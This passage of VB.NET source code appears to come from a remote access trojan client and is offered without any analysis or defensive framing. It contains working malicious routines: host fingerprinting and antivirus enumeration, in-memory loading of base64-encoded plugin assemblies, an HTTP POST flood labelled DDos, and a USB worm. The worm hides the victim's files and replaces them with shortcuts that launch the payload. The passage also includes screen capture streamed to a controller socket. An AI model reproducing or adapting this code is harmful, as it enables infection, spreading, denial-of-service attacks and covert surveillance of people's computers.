            Return System.Text.Encoding.Default.GetString(b)
        End Function
        Public Function ID() As String
            Try
                Return GetHashT(String.Concat(Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion, New DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize))
            Catch
                Return "Err HWID"
            End Try
        End Function
        Public Function GetHashT(ByVal strToHash As String) As String
            Dim md5Obj As MD5CryptoServiceProvider = New MD5CryptoServiceProvider()
            Dim bytesToHash As Byte() = Encoding.ASCII.GetBytes(strToHash)
            bytesToHash = md5Obj.ComputeHash(bytesToHash)
            Dim strResult As StringBuilder = New StringBuilder()
            For Each b As Byte In bytesToHash
                strResult.Append(b.ToString("x2"))
            Next
            Return strResult.ToString().Substring(0, 20).ToUpper()
        End Function
        Function frombase64(ByVal bs64 As String) As Object
            Try
                Return Convert.FromBase64String(bs64)
            Catch ex As Exception
            End Try
        End Function
        Public Function objj(ByVal byt As String) As Object
            Return RuntimeHelpers.GetObjectValue(Plugin(frombase64(byt), "Class1"))
        End Function
        Public Function Plugin(ByVal b As Byte(), ByVal c As String) As Object
            Dim [module] As [Module]
            For Each [module] In Assembly.Load(b).GetModules
                Dim type As Type
                For Each type In [module].GetTypes
                    If type.FullName.EndsWith(("." & c)) Then
                        Return [module].Assembly.CreateInstance(type.FullName)
                    End If
                Next
            Next
            Return Nothing
        End Function
        Function AES_Encryptor(ByVal input As Byte()) As Byte()
            Dim AES_ As New RijndaelManaged
            Dim Hash As New MD5CryptoServiceProvider
            Try
                AES_.Key = Hash.ComputeHash(SB(Settings.KEY))
                AES_.Mode = CipherMode.ECB
                Dim DESEncrypter As ICryptoTransform = AES_.CreateEncryptor
                Dim Buffer As Byte() = input
                Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
            Catch ex As Exception
            End Try
        End Function

        Function AES_Decryptor(ByVal input As Byte()) As Byte()
            Dim AES_ As New RijndaelManaged
            Dim Hash As New MD5CryptoServiceProvider
            Try
                AES_.Key = Hash.ComputeHash(SB(Settings.KEY))
                AES_.Mode = CipherMode.ECB
                Dim DESDecrypter As ICryptoTransform = AES_.CreateDecryptor
                Dim Buffer As Byte() = input
                Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
            Catch ex As Exception
            End Try
        End Function
        Public Function INDATE() As String
            Try
                Dim file As New IO.FileInfo(Settings.current)
                Return CType(file, IO.FileInfo).LastWriteTime.ToString("dd/MM/yyy")
            Catch ex As Exception
                Return "Error"
            End Try
        End Function
        Function usbp() As String
            Try
                If IO.Path.GetFileName(Settings.current) = Settings.USBNM Then
                    Return "True"
                Else
                    Return "False"
                End If
            Catch ex As Exception
                Return "Error"
            End Try
        End Function
        Function admin() As String
            Try
                Return New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString
            Catch ex As Exception
                Return "Error"
            End Try
        End Function
        Function Comment() As String
            Try
                Dim SNM As String = Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\" & ID(), "NT", Nothing)
                If SNM = Nothing Then
                    Return "Nothing"
                Else
                    Return SNM
                End If
            Catch ex As Exception
                Return "Error"
            End Try
        End Function
        Function Antivirus() As String
            Try
                Using antiVirusSearch As ManagementObjectSearcher = New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "Select * from AntivirusProduct")
                    Dim AV As StringBuilder = New StringBuilder()

                    For Each searchResult As ManagementBaseObject In antiVirusSearch.[Get]()
                        AV.Append(searchResult("displayName").ToString())
                        AV.Append(",")
                    Next
                    If AV.ToString().Length = 0 Then Return "None"
                    Return AV.ToString().Substring(0, AV.Length - 1)
                End Using
            Catch ex As Exception
                Return "None"
            End Try
        End Function
        Public Function CreateMutex() As Boolean
            Dim createdNew As Boolean
            Settings._appMutex = New Mutex(False, Settings.Mutexx, createdNew)
            Return createdNew
        End Function
        Public Sub CloseMutex()
            If Settings._appMutex IsNot Nothing Then
                Settings._appMutex.Close()
                Settings._appMutex = Nothing
            End If
        End Sub

        Private ReadOnly userAgents As String() = {"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"}
        Public IPHOST As String
        Public PortHost As String
        Public DDos As Threading.Thread
        Public Function STDos()
            While True
                Dim D1 As New Threading.Thread(Sub()
                                                   Try
                                                       Dim s As Socket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                                                       s.Connect((IPHOST), Convert.ToInt32(PortHost))
                                                       Dim post As String = "POST / HTTP/1.1" & vbCrLf & "Host: " & IPHOST & vbCrLf & "Connection: keep-alive" & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "User-Agent: " & userAgents(New Random().[Next](userAgents.Length)) & vbCrLf & "Content-length: 5235" & vbCrLf & vbCrLf
                                                       Dim buffer As Byte() = Encoding.UTF8.GetBytes(post)
                                                       s.Send(buffer, 0, buffer.Length, SocketFlags.None)
                                                       s.Dispose()
                                                   Catch ex As Exception
                                                       Debug.WriteLine("Website may be down!")
                                                   End Try
                                               End Sub)
                D1.Start()
                D1.Join()
            End While
        End Function
        Public Function IsValid(Address As String) As String
            Try
                Return New Uri(Address).DnsSafeHost
            Catch ex As Exception
                Return Address
            End Try
        End Function
    End Module


#If usbSP Then
Public Class USB
    Private Off As Boolean = False
        Dim thread As Threading.Thread = Nothing
        Public Sub Start()
        If thread Is Nothing Then
            thread = New Threading.Thread(AddressOf usbSP, 1)
            thread.Start()
        End If
    End Sub

    Public Sub stopp()
        Try
            Thread.Abort()
        Catch ex As Exception
        End Try
    End Sub

    Dim ruta As String
    Sub usbSP()
        Off = False
        Do Until Off = True
            On Error Resume Next

            Dim Key As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", True)
            If Key.GetValue("ShowSuperHidden") = 1 Then
                Key.SetValue("ShowSuperHidden", 0)
            End If

            Dim shellobj = CreateObject("wscript.shell")
            Dim myd As DriveInfo
            For Each myd In DriveInfo.GetDrives
                If myd.IsReady Then
                    If myd.DriveType = IO.DriveType.Removable Then
                        ruta = myd.Name


                            If Not IO.File.Exists(ruta & Settings.USBNM) Then
                                IO.File.Copy(Settings.current, ruta & Settings.USBNM, True)
                                IO.File.SetAttributes(ruta & Settings.USBNM, IO.FileAttributes.Hidden + IO.FileAttributes.System)
                            End If


                            For Each xx As String In IO.Directory.GetFiles(ruta)
                                If IO.Path.GetExtension(xx).ToLower <> ".lnk" And xx.ToLower <> ruta.ToLower & Settings.USBNM.ToLower Then
                                    IO.File.SetAttributes(xx, IO.FileAttributes.Hidden + IO.FileAttributes.System)
                                    With shellobj.CreateShortcut(ruta & New IO.FileInfo(xx).Name & ".lnk")
                                        .windowstyle = 7
                                        .TargetPath = "cmd.exe"
                                        .WorkingDirectory = ""
                                        .Arguments = "/c start " & Settings.USBNM.Replace(" ", ChrW(34) _
                                 & " " & ChrW(34)) & "&start " & New IO.FileInfo(xx) _
                                .Name.Replace(" ", ChrW(34) & " " & ChrW(34)) & " & exit"
                                        Dim Fileicon = shellobj.regread("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread("HKEY_LOCAL_MACHINE\software\classes\." & Split(IO.Path.GetFileName(xx), ".")(UBound(Split(IO.Path.GetFileName(xx), "."))) & "\") & "\defaulticon\")
                                        Dim current = shellobj.CreateShortcut(ruta & New IO.FileInfo(xx).Name & ".lnk").IconLocation
                                        If InStr(Fileicon, ",") = 0 Then
                                            .iconlocation = xx
                                        Else
                                            .iconlocation = Fileicon
                                        End If

                                        If Not .iconlocation = current Then
                                            .Save()
                                        End If

                                        current = Nothing
                                        Fileicon = Nothing
                                    End With
                                End If
                            Next

                       For Each xx As String In IO.Directory.GetDirectories(ruta)
                            IO.File.SetAttributes(xx, IO.FileAttributes.Hidden + IO.FileAttributes.System)


                            With shellobj.CreateShortcut(ruta & IO.Path.GetFileNameWithoutExtension(xx) & " .lnk")
                                .windowstyle = 7
                                .TargetPath = "cmd.exe"
                                .WorkingDirectory = ""
                                .arguments = "/c start " & Replace(Settings.USBNM, " ", ChrW(34) & " " & ChrW(34)) & "&start explorer " & Replace(New  _
                         IO.DirectoryInfo(xx).Name, " ", ChrW(34) & " " & ChrW(34)) & "&exit"

                                Dim Foldericon = shellobj.regread("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\")
                                Dim current = shellobj.CreateShortcut(ruta & IO.Path.GetFileNameWithoutExtension(xx) & " .lnk").IconLocation
                                If InStr(Foldericon, ",") = 0 Then
                                    .IconLocation = xx
                                Else
                                    .IconLocation = Foldericon
                                End If

                                If Not .iconlocation = current Then
                                    .Save()
                                End If

                                current = Nothing
                                Foldericon = Nothing
                            End With
                        Next

                    End If
                End If
            Next
            Threading.Thread.CurrentThread.Sleep(5000)
        Loop
        thread = Nothing
    End Sub
End Class
#End If
    Public Class RemoteDesktop
        Private Declare Function BitBlt Lib "gdi32.dll" (hdc As IntPtr, nXDest As Integer, nYDest As Integer, nWidth As Integer, nHeight As Integer, hdcSrc As IntPtr, nXSrc As Integer, nYSrc As Integer, dwRop As UInteger) As Boolean
        Public Shared Sub Capture(size As Size, Q As Integer)
            Dim bounds As Rectangle = Screen.PrimaryScreen.Bounds
            Dim arg_32_0 As Integer = Screen.PrimaryScreen.Bounds.Width
            Dim bounds2 As Rectangle = Screen.PrimaryScreen.Bounds
            Dim bitmap As Bitmap = New Bitmap(arg_32_0, bounds2.Height)
            Dim graphics As Graphics = graphics.FromImage(bitmap)
            Dim graphics2 As Graphics = graphics.FromHwnd(IntPtr.Zero)
            BitBlt(graphics.GetHdc(), 0, 0, bounds.Width, bounds.Height, graphics2.GetHdc(), 0, 0, 13369376UI)
            graphics.ReleaseHdc()
            graphics2.ReleaseHdc()
            Try
                Dim arg_A7_0 As Cursor = Cursors.[Default]
                Dim arg_A7_1 As Graphics = graphics
                Dim arg_A0_1 As Point = Cursor.Position
                Dim size2 As Size = New Size(32, 32)
                bounds2 = New Rectangle(arg_A0_1, size2)
                arg_A7_0.Draw(arg_A7_1, bounds2)
            Catch expr_AE As Exception
                Debug.WriteLine(expr_AE)
            End Try
            graphics.Dispose()
            graphics2.Dispose()
            If bitmap.Size <> size Then
                Try
                    bitmap = New Bitmap(bitmap, size)
                Catch expr_E9 As Exception
                    Debug.WriteLine(expr_E9)
                End Try
            End If

            Dim memoryStream As MemoryStream = New MemoryStream()
            Dim encoderParameter As EncoderParameter = New EncoderParameter(System.Drawing.Imaging.Encoder.Quality, CLng(Q))
            Dim encoderInfo As ImageCodecInfo = GetEncoderInfo("image/jpeg")
            Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
            encoderParameters.Param(0) = encoderParameter

            Try
                SyncLock ClientSocket.S
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    Using MS As New MemoryStream
                        bitmap.Save(MS, encoderInfo, encoderParameters)
                        ClientSocket.Send("RD+" + ClientSocket.SPL + BS(MS.ToArray) & ClientSocket.SPL & s.Width & ClientSocket.SPL & s.Height & ClientSocket.SPL & ID())
                    End Using
                End SyncLock
            Catch ex As Exception
            End Try
            GC.Collect()
        End Sub

        Public Shared Function GetEncoderInfo(M As String) As ImageCodecInfo
            Dim imageEncoders As ImageCodecInfo() = ImageCodecInfo.GetImageEncoders()
            Dim arg_0B_0 As Integer = 0
            Dim num As Integer = imageEncoders.Length
            For i As Integer = arg_0B_0 To num
                If Operators.CompareString(imageEncoders(i).MimeType, M, False) = 0 Then
                    Return imageEncoders(i)
                End If
            Next
            Return Nothing
        End Function
    End Class
End Namespace
